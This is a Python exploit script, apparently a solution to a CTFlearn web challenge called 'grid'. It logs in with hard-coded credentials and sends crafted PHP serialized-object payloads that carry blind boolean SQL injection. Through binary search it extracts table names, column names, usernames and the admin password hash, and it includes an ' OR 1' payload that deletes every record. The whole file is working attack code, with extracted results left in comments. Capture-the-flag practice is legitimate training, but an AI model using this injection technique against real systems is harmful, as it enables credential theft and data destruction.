import requests
import re

sessid = requests.Session()

URL_BASE = 'https://web.ctflearn.com/grid/controller.php?action='
URL_MAIN_PAGE = 'https://web.ctflearn.com/grid/index.php'
URL_ADD_POINT = URL_BASE + "add_point"
URL_DELETE_POINT = URL_BASE + "delete_point&point="
URL_LOGIN = URL_BASE + "login"

ALPHABET_START = 0x19
ALPHABET_END = 0x7E

payload_format = 'O:5:"point":3:{{s:1:"x";s:1:"1";s:1:"y";s:1:"1";s:2:"ID";s:{}:"{}";}}'

points_available = []
regex = re.compile(r"ID:\s(\d{6,})")

def scan_for_ids():
    global points_available
    r = sessid.get(URL_MAIN_PAGE)
    points_available.clear()
    points_available.extend(re.findall(regex, r.text))
    points_available = list(map(lambda x: int(x), points_available))
    # print("Found {} available points".format(len(points_available)))


def spawn_points():
    N = 30
    # print("Adding {} points...".format(N), end='')
    for i in range(N):
        sessid.post(URL_ADD_POINT, data={"x": 1, "y": 1})

    # print(" Done!")

    scan_for_ids()


def send_payload(q):
    if len(points_available) == 0:
        # print("No more points - spawning new")
        spawn_points()

    pid = points_available.pop()
    q = str(pid) + q
    p = URL_DELETE_POINT + payload_format.format(len(q), q)
    # print("Sending: {}".format(p))
    sessid.post(p)

    scan_for_ids()
    if pid not in points_available:
        return True  # point deleted, payload successful

    return False


def check_character(payload_base, table_offset, character_offset, checked_char):
    payload = payload_base.format(table_offset, character_offset, checked_char)
    # print("Character nr. {} | > '{}'".format(character_offset, chr(checked_char)))
    return send_payload(payload)


def final_check(payload, table_offset, character_offset, left_bound, right_bound):
    if check_character(payload, table_offset, character_offset, right_bound):
        return None

    if check_character(payload, table_offset, character_offset, left_bound):
        return right_bound

    return left_bound

def discover_single(payload, table_offset):
    result = []

    for character_offset in range(1, 0x30):  # loop over characters in string
        # binsearch here
        left_bound = ALPHABET_START
        right_bound = ALPHABET_END
        character_found = False

        while left_bound < right_bound:
            delta = right_bound - left_bound
            if delta == 1:
                character_found = final_check(payload, table_offset, character_offset, left_bound, right_bound)
                break

            mid = left_bound + (delta // 2)
            if check_character(payload, table_offset, character_offset, mid):
                left_bound = mid + 1
            else:
                right_bound = mid

        if left_bound == ALPHABET_START or right_bound == ALPHABET_START:
            break

        if character_found:
            result.append(chr(character_found))
        else:
            character_found = final_check(payload, table_offset, character_offset, left_bound, right_bound)
            if character_found:
                result.append(chr(character_found))

    if len(result) > 0:
        print(''.join(result))


def discover_data(payload):
    print("Discovering data for: {}".format(payload))
    for i in range(10):
        discover_single(payload, i)


def clear_all_points():
    send_payload(" OR 1")


if __name__ == '__main__':
    # login
    sessid.post(URL_LOGIN, {"uname": "rivit1", "pass": "rivit1"})
    # print(sessid.cookies)

    scan_for_ids()

    payload_discover_tables = ' AND ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema = database() LIMIT {}, 1), {}, 1))>{}'
    payload_discover_columns_in_tables = ' AND ASCII(SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name = "#TABLE_NAME#" LIMIT {}, 1), {}, 1))>{}'
    payload_discover_usernames = ' AND ASCII(SUBSTRING((SELECT username FROM user LIMIT {}, 1), {}, 1))>{}'
    payload_discover_admin_password = ' AND ASCII(SUBSTRING((SELECT password FROM user WHERE username="admin" LIMIT {}, 1), {}, 1))>{}'


    # discover_data(payload_discover_tables)
    # point
    # user

    # discover_data(payload_discover_columns_in_tables.replace('#TABLE_NAME#', 'point'))
    # id | point_blob | uid

    # discover_data(payload_discover_columns_in_tables.replace('#TABLE_NAME#', 'user'))
    # username | password | uid

    # discover_data(payload_discover_usernames)
    # admin

    discover_data(payload_discover_admin_password)
    # 0c2c99a4ad05d39177c30b30531b119b
    
    # ^ md5




